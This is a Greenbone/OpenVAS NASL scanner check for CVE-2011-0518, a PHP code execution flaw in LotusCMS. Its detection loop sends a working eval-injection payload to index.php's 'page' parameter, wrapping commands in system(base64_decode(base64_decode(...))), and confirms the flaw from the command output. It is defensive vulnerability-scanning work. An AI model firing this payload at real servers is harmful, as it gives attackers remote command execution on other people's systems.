# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.903312");
  script_version("2025-03-05T05:38:53+0000");
  script_cve_id("CVE-2011-0518");
  script_tag(name:"cvss_base", value:"5.1");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2025-03-05 05:38:53 +0000 (Wed, 05 Mar 2025)");
  script_tag(name:"creation_date", value:"2013-06-27 14:55:42 +0530 (Thu, 27 Jun 2013)");
  script_name("LotusCMS PHP Code Execution Vulnerability");

  script_xref(name:"URL", value:"http://secunia.com/advisories/43682");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/52349");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18565");
  script_xref(name:"URL", value:"http://secunia.com/secunia_research/2011-21");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/122161/lotus_eval.py.txt");
  script_xref(name:"URL", value:"http://metasploit.org/modules/exploit/multi/http/lcms_php_exec");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to obtain
  some sensitive information or execute arbitrary code on the vulnerable Web
  server.");

  script_tag(name:"affected", value:"LotusCMS version 3.03, 3.04 and other versions may also be
  affected.");

  script_tag(name:"insight", value:"Input passed via the 'req' and 'page' parameters to index.php is
  not properly sanitised in the 'Router()' function in core/lib/router.php before
  being used in an 'eval()' call.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"LotusCMS is prone to php code execution vulnerability.");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

include("url_func.inc");
include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("host_details.inc");
include("os_func.inc");

port = http_get_port(default:80);

if(!http_can_host_php(port:port))
  exit(0);

foreach dir (make_list_unique("/", "/lcms", "/cms", http_cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";
  url = dir + "/index.php";
  res = http_get_cache( item:url, port:port );
  if( isnull( res ) ) continue;

  if( res =~ "^HTTP/1\.[01] 200" && "LotusCMS<" >< res && "MSS<" >< res ) {

    cmds = exploit_commands();

    foreach cmd (keys(cmds))
    {
      _cmd = base64(str:cmds[cmd]);
      en_cmd = base64(str:_cmd);
      url_en_cmd = urlencode(str:en_cmd);

      url = dir + "/index.php?page=index%27)%3B%24%7Bsystem(base64_decode" +
            "(base64_decode(%27"+ url_en_cmd + "%27)))%7D%3B%23";

      if(http_vuln_check(port:port, url:url, check_header:TRUE,
         pattern:cmd))
      {
        security_message(port:port);
        exit(0);
      }
    }
  }
}

exit(99);
